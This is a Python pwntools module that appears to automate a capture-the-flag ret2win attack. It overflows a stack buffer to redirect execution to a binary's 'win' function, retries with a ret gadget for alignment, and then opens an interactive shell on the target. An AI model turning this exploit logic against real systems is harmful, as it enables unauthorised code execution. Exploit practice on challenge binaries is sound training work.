from pwn import *
from common import *

class ret2win():

	def __init__(self,args):
		self.chall = args.chall
		self.inputs = args.inputs
		self.remote = args.remote
		self.win = args.winfn
		self.offset = args.offset
		self.libc = args.libc
		self.ret = False
		self.gadget = find_gadgets(": ret",self.chall)
		self.compatibility()

	def compatibility(self):
		if self.offset < 0:
			err("Offset calculation failed!")
		if self.win == None:
			err("win function not provided!")
		if self.win not in self.chall.symbols.keys():
			err("win function not found in binary!")

	def solve(self):

		payload = flat([
			b"A"*self.offset,
			self.chall.symbols[self.win]
			])

		if self.ret:
			payload = flat([
				b"A"*self.offset,
				self.gadget,
				self.chall.symbols[self.win]])

		io = start(self.remote,self.chall,self.libc)
		send_payload(payload,self.inputs,io)

		try:
			io.sendline(b"ls")
			io.recv(1,timeout=5)
			io.interactive()
		except:
			if self.ret:
				err("ret2win failed even with ret gadget!")
			else:
				log.info("ret2win failed, trying with ret gadget now")
				io.close()
				self.ret = True
				self.solve()